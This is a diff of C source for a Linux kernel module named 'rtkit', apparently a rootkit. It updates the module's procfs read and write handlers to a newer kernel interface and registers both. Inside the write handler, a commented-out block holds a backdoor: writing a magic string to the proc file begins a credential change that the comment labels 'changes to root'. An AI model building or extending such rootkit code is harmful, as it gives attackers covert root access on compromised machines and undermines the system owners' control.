@@ -96,7 +96,7 @@ For example, 'lsmod' is the same as 'cat /proc/modules' while 'lspci' is a synon
 By altering files located in this directory you can even read/change kernel parameters (sysctl) while the system is running.
 */
 
-int *rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
+ssize_t rtkit_read(struct file *file, char __user *buffer, size_t count, loff_t *data)
 {
     /*int size;
 	
@@ -129,7 +129,7 @@ STATUS\n\
 	return size-off;*/
 }
 
-int *rtkit_write(struct file *file, const char __user *buff, size_t count, loff_t *data)
+ssize_t rtkit_write(struct file *file, const char __user *buff, size_t count, loff_t *data)
 {
     /*if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
 		struct cred *credentials = prepare_creds();
@@ -151,10 +151,9 @@ int *rtkit_write(struct file *file, const char __user *buff, size_t count, loff_
         return count;*/
 }
 
-
 struct file_operations new_proc_fops = {
-    //read: rtkit_read_ptr,
-    write : rtkit_write
+    read : &rtkit_read,
+    write : &rtkit_write
 };
 
 static int __init procfs_init(void)
